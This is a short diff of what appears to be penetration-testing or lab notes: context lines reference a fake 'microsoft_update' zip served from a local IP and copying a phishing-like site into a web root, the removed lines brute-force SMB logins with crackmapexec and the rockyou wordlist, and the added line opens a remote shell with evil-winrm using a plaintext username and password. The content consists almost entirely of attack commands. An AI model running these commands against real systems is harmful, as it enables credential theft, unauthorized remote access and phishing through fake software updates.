@@ -19,15 +19,7 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
-
-sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-
-crackmapexec smb 192.168.1.84 -u convidado -p ""
-
-crackmapexec smb 192.168.1.84 -u root -P /usr/share/wordlists/rockyou.txt
-
-
-
+evil-winrm -i 192.168.1.84 -u rsilva -p rsilva2020
 
 
 
